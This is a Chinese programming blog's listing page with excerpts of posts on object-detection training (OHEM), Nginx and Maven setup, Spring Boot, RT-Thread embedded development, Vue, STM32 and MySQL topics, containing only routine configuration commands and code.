			<a href="/posts/57a446952a4c124bc16b839b70a30812/" rel="bookmark">
			【目标检测——OHEM 解读】处理类别不平衡问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
在接触一个新技术之前，肯定是因为遇到了新的难题，但这可以促使我们前进。
hard Negative Mining介绍
OHEM 概要解读
mmdetection中的OHEM
损失函数当中加入OHEM思想——图像分割损失函数OhemCELoss
文献引用：
前言 在接触一个新技术之前，肯定是因为遇到了新的难题，但这可以促使我们前进。 之前做个一个目标检测任务，每个类别之间的数据量差距较大，有明显的类别不均衡现象（当样本比例大于4：1时）。
解决类别不平衡问题现以有了较多的可行解决方案：
对于目标检测，可以使用OHEM技术进行扩大数据广度。使用基于交叉熵损失改进的Focal Loss损失函数。对类别多的数据类别进行欠采样（减少一些重复的数据）。对于类别较少的数据使用过采样，通过数据增广（色彩变换，仿射变换等）进行扩充。 本篇博客主要会记录在研究OHEM技术时的一些总结。
hard Negative Mining介绍 在two-stage检测算法中，RPN阶段会生成大量的检测框，由于很多时候一张图片可能只会有少量几个标注框（真实框），也就是说绝大部分检测框与真实框没有很大的交集，一般计算的IOU大于设置阈值时认为是正样本，小于设置阈值时是负样本。
但是这样选出来的框不一定是最容易错的框。
我们通常在生成检测框负样本中选出容易预测错误的（当成正样本的），作为新的数据集进行参与训练。
即hard Negative Mining（困难样本挖掘）。
思想：
你不会把所有错题都放到错题集中，只对当中最容易的错放入。
实现思想：
迭代地交替训练，用样本集更新模型，然后再固定模型，来选择分辨错的目标框并加入到样本集中继续训练。
缺点：
hard Negative Mining（困难样本挖掘）需要在不断的训练当中冻结参数、预测选出hard Negative再放入训的训练集，这大幅度的增加了工作量，加大了模型训练的时间。
注：一般使用 SVM 分类器才能使用此方法（SVM 分类器和 Hard Negative Mining Method 交替训练）
OHEM 概要解读 前言：
hard Negative Mining（困难样本挖掘）思想值得我们去使用和学习，但是我们试图在不影响效果的前提下去提高模型的迭代训练速度。故我们提出了OHEM（在线难例挖掘）。
论文：
1604.03540.pdf (arxiv.org)https://arxiv.org/pdf/1604.03540.pdfOHEM（在线难例挖掘）流程概述：
1、进行一次的前向传播，获得每个Region proposal单独的损失值。
2、对每个Region proposal进行NMS计算。
3、对剩下的Region proposal按照损失值进行排序，然后选取损失最大的前一部分Region当做输入再次输入分类回归网络，对于训练多次loss还较高的我们可以认为其是困难样本。
4、将困难样本输入图中的（b）模块，（b）模块是（a）模块的复制版，（b）模块是用来反向传播的部分，然后吧更新的参数共享到（a）部分。
注：所谓的线上挖掘，就是先计算loss→筛选→得到困难负样本。
mmdetection中的OHEM 前言：
其实在mmdetection当中，已经封装好了OHEM的代码，但是大家可能都不知道他在哪，这里我给大家找一下他的位置。
彩蛋：
如何在mmdetection查找自己想要的东西（类或者类的调用等）
损失函数当中加入OHEM思想——图像分割损失函数OhemCELoss 前言：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57a446952a4c124bc16b839b70a30812/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/972345102cc89e5dee951f7dfbea076a/" rel="bookmark">
			小技巧：罗技一个接收器连接多个鼠标或键盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装Logitech Unifying™ 优联软件：
1 只接收器 - 6 个设备 最多可以将六个罗技 Unifying™ 优联无线鼠标或键盘连接至一只小巧又节省空间的 Unifying 优联 USB 接收器。
Unifying Software – Logitech 支持 + 下载Unifying Software Morehttps://support.logi.com/hc/zh-cn/articles/360025297913
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1b49aaee31260836c96f955ea5d1769/" rel="bookmark">
			Java集成WebSocket
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 什么是websocket，为什么不使用HTTP 协议 WebSocket协议是基于TCP的一种新的网络协议。它实现了客户端与服务器全双工通信。而HTTP是单工通信，通信只能由客户端发起，客户端请求一下，服务器处理一下，这就太麻烦了。于是websocket应运而生。
2. SpringBoot 集成 WebSocket 2.1 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-websocket&lt;/artifactId&gt; &lt;/dependency&gt; 2.2 启用Springboot对WebSocket的支持 import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.socket.server.standard.ServerEndpointExporter; @Configuration public class WebSocketConfig { @Bean public ServerEndpointExporter serverEndpointExporter() { return new ServerEndpointExporter(); } } 2.3 核心配置：WebSocketServer WebSocket是类似客户端服务端的形式(采用ws协议)，那么这里的WebSocketServer其实就相当于一个ws协议的Controller@ ServerEndpoint 注解是一个类层次的注解，它的功能主要是将目前的类定义成一个websocket服务器端, 注解的值将被用于监听用户连接的终端访问URL地址,客户端可以通过这个URL来连接到WebSocket服务器端 import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper; import com.baomidou.mybatisplus.core.conditions.update.UpdateWrapper; import lombok.extern.slf4j.Slf4j; import org.springframework.stereotype.Component; import org.springframework.stereotype.Service;import javax.websocket.*; import javax.websocket.server.PathParam; import javax.websocket.server.ServerEndpoint; import java.io.IOException; import java.time.LocalDateTime; import java.util.List; import java.util.concurrent.CopyOnWriteArraySet; @Component @Slf4j @Service @ServerEndpoint("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1b49aaee31260836c96f955ea5d1769/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01408ec0aceee1489b72664bdcc4454c/" rel="bookmark">
			Linux之Nginx
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Nginx: 1.什么是nginx
Nginx是一款高性能的Web服务器，最初由俄罗斯程序员Igor Sysoev开发，自2004年问世以来，凭借其高性能、高可靠、易扩展等优点，在反向代理、负载均衡、静态文件托管等主流场合得到了广泛的应用。
2.CentOS7中使用yum安装Nginx的方法
添加 nginx 官方提供的 yum 源(需要联网且时间较长)
rpm -Uvh http://nginx.org/packages/centos/7/x86_64/RPMS/nginx-1.14.2-1.el7_4.ngx.x86_64.rpm
使用 yum 安装 nginx
yum install nginx
注1：yum方式安装nginx，它的安装根目录为/etc/nginx 注2：查看nginx版本 rpm -qa | grep nginx 启动及设置开机启动
systemctl start nginx.service
systemctl enable nginx.service
设置防火墙开放 80 端口
firewall-cmd --zone=public --add-port=80/tcp --permanent
firewall-cmd --reload &amp;&amp; firewall-cmd --list-port
测试 nginx 是否可被访问，应该显示nginx的欢迎界面
http://服务器IP地址:80/
3.mysql数据库数据导出/导入
Navicat导出表结构及少量数据
4.项目部署到虚拟机
本案例采用tomcat双节点方式进行案例演示（tomcat集群模式）
注0：由于tomcat双节点都是部署在同一个虚拟机中，请配置两个不同的端口号，以免冲突；
注1：重启虚拟机后，发现有时候linux中的tomcat启动失败，应该将tomcat服务在mysql服务启动后启动。重要
注2：可将WEB项目部署到不同的tomcat中，可做集群测试
将SPA项目压缩并上传到/usr/nginx/html目录，再解压
mkdir /usr/nginx/html
unzip crm.zip
#重启nginx
#重新修改window中的hosts文件
注1：通过虚拟域名访问，还要修改window的hosts文件添加虚拟域名映射，文件位置如下：
C:\Windows\System32\drivers\etc\hosts
另外，此文件有可能出现由于当前用户权限不够，出现无法修改的情况？解决方案
将此文件复制到d硬盘任一目录，修改后，再复制替换C:\Windows\System32\drivers\etc\hosts原文件
5.通过nginx对tomcat进行集群及代理
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01408ec0aceee1489b72664bdcc4454c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e84224536dada17fa2e67a9a86d0e786/" rel="bookmark">
			使用Mybatis-Plus时，想要手动插入自增id的值，怎么解决？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 使用Mybatis-Plus时，想要手动插入自增id的值，怎么解决？
今天在做项目的时候，有一个需求就是同步数据库中的内容，本次做的是增量同步数据，想要增量同步，第一个想法就是使用自增id去比对两个库中的数据，查到新数据库中的最大的id,因为是自增，所以需要同步的库中大于这个id的都为新数据。
下面我将需要添加数据的数据库叫为1库，有数据的为2库
于是：
2库：
我将1库清空
执行数据同步：
但是结果出乎我的意料，
因为主键是自增的，所以新插入的数据主键为自增向下排，也就是id从137开始的
,
这会让下次同步的时候出现数据错误，
解决： 属性：
加入手动输入属性就好
@TableId(value = "id",type = IdType.INPUT) public enum IdType { AUTO(0), //自增 NONE(1), //未设置主键 INPUT(2), //手动输入 ASSIGN_ID(3), //默认全局唯一ID ASSIGN_UUID(4), //全局唯一的 uuid 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a60fb55cf833a288638f267aa93bf27/" rel="bookmark">
			kali 普通用户没有声音
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：kali正常启动没有声音
今天在重启的时候，插着耳机，导致开机后网易云和浏览器页面都没有声音，具体为什么没有找到。
解决 查看是否安装alsamixer，输出如下图1，则是没有问题
apt-cache search alsamixer #查看是否安装alsamixer # 安装了，就执行下面的命令 alsamixer # 没有安装，就先安装，然后执行下面的命令 sudo apt install alsamixer alsamixer 图一：
图二：这里显示的是M，是静音状态，键盘点击m启用声音
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86dc68a4fd4856d69d55d5376c39d71d/" rel="bookmark">
			3.RTT-ADC采集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前面一期内容讲述了GPIO的控制编程和配置，今天来学习一下ADC采集，能够学习到RTT的同学自然也都是玩单片机的老手了，至于ADC是什么东西也不用我来解释说明了，如果有不懂的可以去百度或者去官方标准手册里面查看。在学习ADC采集之前我们需要引入一下Kconfig语法，目的是让大家知道为何要在Settings中进行选择，为何选择后就能够驱动起来ADC。注意：记得提前安装CubeMX否则无法进行配置开发
1.Kconfig的引入 Kconfig在RT-Thread中的工作机制：
C语言项目的裁剪配置本质上通过条件编译和宏的展开来实现的，RT-Thread借助Kconfig这套机制更方便的实现了这一功能。当前以Windows下Env工具中的使用为例，简述Kconfig在RT-Thread的工作机制。
Kconfig机制包括了Kconfig文件和配置UI界面（如menuconfig，pyconfig等）。Kconfig机制有如下特点：
Kconfig文件中的配置项会映射至rtconfig.h中Kconfig文件可以随源码分散至各级子目录，便于灵活修改。 由于内容太多并且复杂，具体的内容到官方网站上的手册中查看，路径如下：
2.对照Kconfig查看Settings 在对Kconfig有一定了解后可以参考Settings来验证手册中讲述的Kconfig语法作用。这个可视化界面Settings和Kconfig语法编写的Kconfig文件是一一对应的所以在制作自己的bsp包的时候可以利用Kconfig语法来丰富自己的bsp包从而达到在以后的开发中更加高效轻松的目的。
3.开始ADC的配置 打开Settings点击红框里面的按钮，进入到硬件配置。
Ctrl+S保存一下配置然后编译一下，这时候会发现报错了，爆了一大堆，不要慌！报错的原因是虽然在应用层使能了ADC框架但是在驱动层上没有进行配置，这时候打开工程文件的CubeMX开始配置ADC驱动引脚。
在工程列表下找到board文件夹打开找到下图文件
进入这个文件，然后就能看到CubeMX的工程文件了（注意：记得提前安装CubeMX否则无法进行配置开发）
点击进去，然后界面如下：
这是打开开发板原理图寻找一个ADC通道。这里我们就随便选一个PC0吧，去到CubeMX进行配置。
可以看到有多组ADC，我们随便选择就行，我们选择ADC1的通道10，这时候生成代码便可。
重新编译一下，没有报错了
这时候下载程序，然后进入串口助手进行调试。
4.FinSH命令调试 系统运行后桉tab键即可弹出可以使用的命令，这时adc也出现了然后根据图片命令顺序进行调试即可。（注意：这里只是调试，代码应用在下一小节）
5.ADC读取电平代码应用 在文件夹里面创建一个adc.c文件（注意：创建文件的方法和位置不固定，按照个人爱好来操作即可）
创建完后开始编写adc采集代码（代码官方手册中有示例可以参考，如果编译报错很多的话就到Settings中关闭ADC编译一下然后再打开ADC编译就没有问题了，这个因该是软件的bug，还有一种办法就是在工程列表空白处右键然后点击“同步scons配置至项目”）
/*adc.c * Copyright (c) 2006-2021, RT-Thread Development Team * * SPDX-License-Identifier: Apache-2.0 * * Change Logs: * Date Author Notes * 2022-11-05 ZXY the first version */ /* * 程序清单： ADC 设备使用例程 * 例程导出了 adc_sample 命令到控制终端 * 命令调用格式：adc_sample * 程序功能：通过 ADC 设备采样电压值并转换为数值。 * 示例代码参考电压为3.3V,转换位数为12位。 */ #include &lt;rtthread.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86dc68a4fd4856d69d55d5376c39d71d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1c853e2897f892d983871c724d7423d/" rel="bookmark">
			idea&#43;maven&#43;selenium环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.idea下载安装：
2.maven下载与配置：
​-编辑-下载完后解压安装包​编辑
-配置环境变量
-打开cmd执行命令mvn -version验证是否配置成功
-.m2文件
-配置镜像仓库
3.idea中创建maven项目
4.selenium配置
1.idea下载安装： -idea官网下载地址IntelliJ IDEA: The Capable &amp; Ergonomic Java IDE by JetBrains
2.maven下载与配置： maven是Apache基于ANT进行了升级，使用项目对象模型（POM-project object model）
-maven官方下载地址Maven – Download Apache Maven
-下载完后解压安装包 -maven目录结构
bin:存放执行文件
boot:启动jar包
conf:该目录下的settings.xml是maven的核心配置文件
-配置环境变量 MAVEN_HOME
D:\apache-maven-3.8.6
-打开cmd执行命令mvn -version验证是否配置成功 -.m2文件 初次使用时C:\Users\ 目录下并没有.m2文件，是因为并没有执行任何maven相关的命令，执行后会自动创建.m2文件
cmd执行mvn help:system,之后会生成.m2文件
默认仓库位置，建议使用此路径C:\Users\mxy\.m2\repository
-将maven目录下的setting文件复制到.m2目录下
-配置镜像仓库 默认仓库使用的是Apache的中央仓库，中央仓库访问比较慢，可以配置成阿里云仓库
打开setting文件进行配置
镜像仓库
&lt;!-- 阿里云仓库 --&gt;
&lt;mirror&gt;
&lt;id&gt;alimaven&lt;/id&gt;
&lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
&lt;name&gt;aliyun maven&lt;/name&gt;
&lt;url&gt;http://maven.aliyun.com/nexus/content/repositories/central/&lt;/url&gt;
&lt;/mirror&gt;
&lt;!-- 中央仓库1 --&gt;
&lt;mirror&gt;
&lt;id&gt;repo1&lt;/id&gt;
&lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
&lt;name&gt;Human Readable Name for this Mirror.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1c853e2897f892d983871c724d7423d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef91d0dbe6466c1718ca08b87f4458c5/" rel="bookmark">
			windows nignx 常用操作命令（启动、停止、重启服务）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 查看nginx 版本号：2. 根据名称查询 window 下的nginx 的启动进程：3. 再根据端口号查询进程：4. 启动nginx 命令：5. 停止nginx:6. 快速停止或关闭Nginx:7. 正常停止或关闭Nginx：8. 配置文件修改重装载命令： 最近在window 上安装了nginx ,对nginx 的操作不是很熟，故在此记录一下常用操作，以便以后查阅 同时跟小伙伴分享一下： 操作步骤 ：
cmd 管理员运行， cd 到 nginx 安装根目录
1. 查看nginx 版本号： nginx -v
nginx -t 命令验证配置文件的正确性
2. 根据名称查询 window 下的nginx 的启动进程： tasklist /fi “imagename eq nginx.exe”
此处看到启动了两个nginx 进程，一个是命令进程，一个是nginx 应用进程
taskkill /f /pid 13568
删除这个命令进程后就没法执行 nignx 命令了。
taskkill /f /pid 2312
删除2312进程后 nginx 就停止了
3. 再根据端口号查询进程： netstat -ano | findstr 30090
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ef91d0dbe6466c1718ca08b87f4458c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73bb8cb757352c1ac011d1bc633ebc89/" rel="bookmark">
			linuxC语言_用select函数或线程池两种方法制作tcp服务器[可同时接受处理多个客户端发来的指令或者处理与服务器创建新连接请求]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linuxC语言_用select函数或线程池两种方法制作tcp服务器[可同时接受处理多个客户端发来的指令或者处理与服务器创建新连接请求] 线程池TCP服务器后面更新~~~select函数详解tcp服务器的初始化用链表和select函数不断去接受新客户端申请创建新连接或接受客户端发送指令内核链表解析源码下载 线程池TCP服务器后面更新~~~ select函数详解 select (I/O 多工机制) 头文件 #include &lt;sys/time.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; 定义函数 int select(int n, fd_set * readfds, fd_set * writefds, fd_set * exceptfds, struct timeval * timeout); 函数说明 select()用来等待文件描述词状态的改变. 参数 n 代表最大的文件描述词加 1, 参数 readfds、 writefds 和 exceptfds 称为描述词组, 是用来回传该描述词的读, 写或例外的状况. 底下的宏提供了处理这 三种描述词组的方式: FD_CLR(inr fd, fd_set* set); 用来清除描述词组 set 中相关 fd 的位 FD_ISSET(int fd, fd_set *set); 用来测试描述词组 set 中相关 fd 的位是否为真 FD_SET(int fd, fd_set*set); 用来设置描述词组 set 中相关 fd 的位 FD_ZERO(fd_set *set); 用来清除描述词组 set 的全部位 参数 timeout 为结构 timeval, 用来设置 select()的等待时间, 其结构定义如下 struct timeval { time_t tv_sec; time_t tv_usec; }; 返回值 如果参数 timeout 设为 NULL 则表示 select ()没有 timeout.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73bb8cb757352c1ac011d1bc633ebc89/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85d99d0dde25d00f5526afc2f4b1e35a/" rel="bookmark">
			I/O 设备模型-1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、简介
1.1、时序1
1.2、时序2
2、I/O 设备模型
2.1、设备对象
2.1.1、设备类型
2.1.2、操作方法
2.1.3、设备flag
2.1.4、常用设备命令
2.2、设备接口
2.2.1、rt_device_create()函数
2.2.2、rt_device_destroy()函数
2.2.3、rt_device_register()函数
2.2.4、rt_device_unregister()函数
2.2.5、rt_device_find()函数
2.2.6、rt_device_init()函数
2.2.7、rt_device_open()函数
2.2.8、rt_device_close()函数
2.2.9、rt_device_read()函数
2.2.10、rt_device_write()函数
2.2.11、rt_device_control()函数
2.2.12、rt_device_set_rx_indicate()函数
2.2.13、rt_device_set_tx_complete()函数
1、简介 RT-Thread 提供了一套简单的 I/O 设备模型框架，它位于硬件和应用程序之间，共分成三层，从上到下分别是 I/O 设备管理层、设备驱动框架层、设备驱动层。
使用 I/O 设备管理框架开发应用程序，有如下优点：
1）移植性：使用同一套标准的 API 开发应用程序，使应用程序具有更好的移植性
2）解耦：底层驱动的升级和修改不会影响到上层代码
3）协同开发：驱动和应用程序相互独立，方便多个开发者协同开发
I/O 设备管理层实现对设备驱动程序的封装。应用程序通过 I/O 设备层提供的标准接口访问底层设备，设备驱动程序的升级、更替不会对上层应用产生影响。这种方式使得设备的硬件操作相关的代码能够独立于应用程序而存在，双方只需关注各自的功能实现，从而降低了代码的耦合性、复杂性，提高了系统的可靠性。设备驱动框架层是对同类硬件设备驱动的抽象，将不同厂家的同类硬件设备驱动中相同的部分抽取出来，将不同部分留出接口，由驱动程序实现。设备驱动层是一组驱使硬件设备工作的程序，实现访问硬件设备的功能。它负责创建和注册 I/O 设备。 1.1、时序1 对于操作逻辑简单的设备，可以不经过设备驱动框架层，直接将设备注册到 I/O 设备管理器中。如设备驱动HWTIMER。
1.2、时序2 对于另一些设备，如看门狗等，则会将创建的设备实例先注册到对应的设备驱动框架中，再由设备驱动框架向 I/O 设备管理器进行注册
2、I/O 设备模型 RT-Thread 的设备模型是建立在内核对象模型基础之上的，设备被认为是一类对象，被纳入对象管理器的范畴。每个设备对象都是由基对象派生而来，每个具体设备都可以继承其父类对象的属性，并派生出其私有属性。
2.1、设备对象 struct rt_device { struct rt_object parent; /* 内核对象基类 */ enum rt_device_class_type type; /* 设备类型 */ rt_uint16_t flag; /* 设备参数 */ rt_uint16_t open_flag; /* 设备打开标志 */ rt_uint8_t ref_count; /* 设备被引用次数 */ rt_uint8_t device_id; /* 设备 ID,0 - 255 */ /* 数据收发回调函数 */ rt_err_t (*rx_indicate)(rt_device_t dev, rt_size_t size); rt_err_t (*tx_complete)(rt_device_t dev, void *buffer); #ifdef RT_USING_DEVICE_OPS const struct rt_device_ops *ops; /* 设备操作方法 */ #else /* 常见设备接口 */ rt_err_t (*init) (rt_device_t dev); rt_err_t (*open) (rt_device_t dev, rt_uint16_t oflag); rt_err_t (*close) (rt_device_t dev); rt_size_t (*read) (rt_device_t dev, rt_off_t pos, void *buffer, rt_size_t size); rt_size_t (*write) (rt_device_t dev, rt_off_t pos, const void *buffer, rt_size_t size); rt_err_t (*control)(rt_device_t dev, int cmd, void *args); #endif /* RT_USING_DEVICE_OPS */ /* 兼容POSIX */ #ifdef RT_USING_POSIX_DEVIO const struct dfs_file_ops *fops; struct rt_wqueue wait_queue; #endif /* RT_USING_POSIX_DEVIO */ /* 设备的私有数据 */ void *user_data; }; typedef struct rt_device *rt_device_t; 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/85d99d0dde25d00f5526afc2f4b1e35a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e20e2d1ddebea444e9656049f8a879e5/" rel="bookmark">
			行程编码(RLE)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 行程编码（RLE） 一、行程编码原理1、具体例子 二、 代码实现 一、行程编码原理 又称为行程长度编码（Run Length Encoding， RLE），是一种熵编码。编码原理： 将具有相同值得连续串用其长和一个代表值代替。该连续串称为行程 1、具体例子 字符串：
tttttiiiiiiiiiaaa 行程编码后：[5, t][8, i][3, a] RLE编码后是：5t8i3a
详细编码流程参考
二、 代码实现 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61deea0b28fb327438da06de3ae82de8/" rel="bookmark">
			云服务器环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		virtualbox 部署ubuntu--janus_fdsafwagdagadg6576的博客-CSDN博客
Ubuntu下搭建Janus Server_fdsafwagdagadg6576的博客-CSDN博客_janus部署
https://www.jianshu.com/p/b997256efb09
ftp搭建
云服务器拷贝：vnc不能拷贝；xshell可以
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d92807caf15290d2d53c5ecedef83f4a/" rel="bookmark">
			springboot项目中的dto的参数校验及统一异常处理的简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		springboot项目中的dto的参数校验以及统一异常处理 依赖包dto类中的注解controller中的修改创建validate异常处理器 依赖包 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt; &lt;version&gt;2.7.3&lt;/version&gt; &lt;/dependency&gt; dto类中的注解 根据下图可以看到有这么多的注解可以使用，就不一一列举了，挑两个常用的演示下
来一段dto中的代码
@Data @ToString public class UmsMemberRegisterDTO { // 可以限制住该参数的位数 @Size(min = 6, max = 16, message = "用户名6位到16位") private String username; @Size(min = 8, max = 16, message = "密码位数为8~16") private String password; private String icon; // 校验email格式 @Email private String email; // 不能为空 @NotEmpty private String nickName; } controller中的修改 只需要将参数中添加@Valid注解
// 注册 @PostMapping("/register") public ResultWrapper register(@RequestBody @Valid UmsMemberRegisterDTO umsMemberRegisterDTO){ return umsMemberService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d92807caf15290d2d53c5ecedef83f4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01e83784e72e9612777a82c378a6d6d8/" rel="bookmark">
			vue判断设备是移动端还是pc端
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎访问我的博客地址 : 博客地址
判断pc与手机端，根据不同的设置跳转不同的路由。
const routes = [ { path: "", redirect:'/test' }, { path: "/test", // pc端首页 component: () =&gt; import( "../components/test.vue") }, { path: '/mi', // 手机端首页 component: () =&gt; import( "../components/mi.vue") } ]; const router = new VueRouter({ routes }); export default router; 在 App.vue 中实现逻辑判断：
methods:{ _isMobile() { let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i) return flag; } }, mounted(){ if (this._isMobile()) { alert("手机端"); this.$router.replace('/mi'); } else { alert("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01e83784e72e9612777a82c378a6d6d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b007c4c47bc01a9be682108e9073f2f/" rel="bookmark">
			基于stm32单片机PT100铂电阻温度采集系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		资料编号：175 下面是实物功能视频演示：
175-基于Stm32单片机PT100铂电阻温度采集系统
功能讲解：
采用的正点原子STM32F1精英版开发板，4.3寸TFTLCD显示屏，采用MAX31865模块外接PT100传感器，开发板与MAX31865直接采用SPI接口，接口对应的spi1接口（PA4,PA5,PA6,PA7），可以随时采集当前温度，并且显示导LCD屏幕上，该设计中采用了4个IO进行触发，触发一次记录一次当前的温度，最多可以记录30组数据，如果不需要触发可以在程序中注释掉，4个IO触发分别接开发板 PB4 PB5 PB6 PB7，并且还有一个清屏的按钮，采用的PB13，按一次对屏幕进行清屏处理，全套资料齐全：
下面是原理图展示： 下面是程序展示： //初始化SPI max31865 的IO口
void SPI1_MAX31865_Init(void)
{
SPI1_Init(); //初始化SPI1
SPI1_SetSpeed(SPI_BaudRatePrescaler_64); //设置为 72/64 = 1.125 M时钟
writeRegister8_1(0x00, 0x00); //清除配置寄存器
enableBias_1(1); //使能偏置电压
delay_ms(10); //等待10ms使得RTDIN的滤波电容充电
setWires_1(MAX31865_3WIRE); //使能PT100 三线工作模式
clearFault_1(); //清除故障检测位
} //RTD接线模式设置
void setWires_1(max31865_numwires_t wires)
{
uint8_t t = readRegister8_1(MAX31856_CONFIG_REG);
if (wires == MAX31865_3WIRE) {
t |= MAX31856_CONFIG_3WIRE;
} else {
// 2 or 4 wire
t &amp;= ~MAX31856_CONFIG_3WIRE;
}
writeRegister8_1(MAX31856_CONFIG_REG, t);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b007c4c47bc01a9be682108e9073f2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99a27f92746429c0ceb4fcfd8699b602/" rel="bookmark">
			mysql json 字段作为where查询条件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql5.7以上支持json的操作，以及增加了json存储类型
一般数据库存储json类型的数据会用json类型或者text类型
注意：用json类型的话
1）JSON列存储的必须是JSON格式数据，否则会报错。
2）JSON数据类型是没有默认值的。
查询根据表字段的json内容进行查询
首先创建表
插入几个测试数据 执行查询sql
使用 字段-&gt;’$.json属性’进行查询条件
select * from log where data-&gt;'$.id' = 142;
或
select data-&gt;'$.id' id,data-&gt;'$.name' name from log where data-&gt;'$.id' = 142;
测试根据json数组的字段查询
1.再建一个表log2,插入几条json数组数据
查询json数组里面对象的id等于142的记录
用JSON_CONTAINS(字段,JSON_OBJECT(‘json属性’, “内容”))
select * from log2 where JSON_CONTAINS(data,JSON_OBJECT('id', "142"))
文章转载：mysql json 字段作为where查询条件_51CTO博客_mysql json字段查询
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4d2e62ae5bb664733fb81068b3724c7/" rel="bookmark">
			MySQL索引篇（一）--从数据页的角度看B&#43;树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 上一篇文章讲到 MySQL 里 InnoDB 存储引擎是采用 B+ 树来组织数据的。这点没错，但是大家知道 B+ 树里的节点里存放的是什么呢？查询数据的过程又是怎样的？这次，我们从数据页的角度看 B+ 树，看看每个节点长啥样。
InnoDB是如何存储数据的 MySQL 支持多种存储引擎，不同的存储引擎存储数据的方式也是不同的，我们最常使用的是 InnoDB 存储引擎，所以就跟大家图解下InnoDB 是如何存储数据的。
记录是按照行来存储的，但是数据库的读取并不以「行」为单位，否则一次读取（也就是一次 I/O 操作）只能处理一行数据，效率会非常低。
因此，InnoDB 的数据是按「数据页」为单位来读写的，也就是说，当需要读一条记录的时候，并不是将这个记录本身从磁盘读出来，而是以页为单位，将其整体读入内存。
